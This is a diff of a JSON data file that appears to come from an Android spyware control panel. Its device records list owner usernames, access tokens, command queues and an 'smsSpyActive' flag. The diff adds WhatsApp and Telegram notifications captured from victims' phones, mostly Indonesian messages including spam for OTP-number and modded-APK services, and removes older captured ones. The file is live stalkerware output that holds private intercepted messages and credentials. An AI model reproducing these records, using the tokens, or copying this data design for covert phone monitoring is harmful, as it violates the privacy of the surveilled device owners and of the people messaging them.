@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776770378373,
+    "lastSeen": 1776770396362,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776770379151,
+    "lastSeen": 1776770397040,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 18:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770397773
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Yøriē Qwērty ʚɞ [ OPEN MANTA'X ]",
+        "content": "✨✨✨   ✨✨✨✨✨\n\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n\n⪼━━〔 FEATURE 🤍 〕━━⪻\n➡️Banyak layanan ready\n➡️OTP langsung masuk⚡️\n➡️Deposit QRIS instan\n➡️Harga mulai 1K🪙\n➡️Server stabil & fast🤔\n➡️Online 24/7\n➡️ Ada Kode Voucher nya\n➡️New user free balance 300p⛏\n\n💬 Layanan:\nWA📱 • Telegram📱 • Gmail • IG📱\nTikTok📱 • FB📱 • Shopee • dll\n\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n@OrderyorieeBot⭐\n\n😡 START SEKARANG",
+        "time": "21/04 18:19",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776770379285
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "📎 📊 ₹100 Deposit To Unlock This JaiClub [Mod] Apk ⚡️\n\n💎 JaiClub 🤩 [Panel] Apk Download Now 💎",
+        "time": "21/04 18:19",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776770379263
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Testimoni Gift",
+        "content": "🖼 🎉 User Baru Masuk!\n\n👤 @ezlipwz\n🆔 5086024107\n⏰ 21/4/2026, 11.19.37",
+        "time": "21/04 18:19",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776770379214
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13610,38 +13642,6 @@
         "time": "21/04 17:53",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776768791142
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:53",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768791133
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:53",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768791121
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16939 pesan baru dari 113 obrolan",
-        "time": "21/04 17:53",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768790545
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:52",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776768777503
       }
     ],
     "galleryPhotos": [],
